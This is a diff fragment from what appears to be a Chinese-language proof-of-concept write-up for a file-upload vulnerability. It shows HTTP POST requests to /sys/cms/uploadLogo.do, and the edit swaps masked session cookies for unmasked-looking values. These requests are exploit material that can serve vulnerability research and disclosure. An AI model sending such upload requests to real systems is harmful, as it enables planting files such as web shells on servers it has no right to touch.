@@ -89,7 +89,7 @@ POC/EXP：获得上传路径
 POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
-Cookie: JSESSIONID=3******************************3
+Cookie: JSESSIONID=3199B98D03
 Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
 
 ------WebKitFormBoundaryfjKBvGWJbG07Z02r
@@ -123,7 +123,7 @@ POC/EXP:文件上传
 POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
-Cookie: JSESSIONID=1******************************0
+Cookie: JSESSIONID=163CC9FFC3CAAEAFCF0
 Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
 
 ------WebKitFormBoundaryfjKBvGWJbG07Z02r
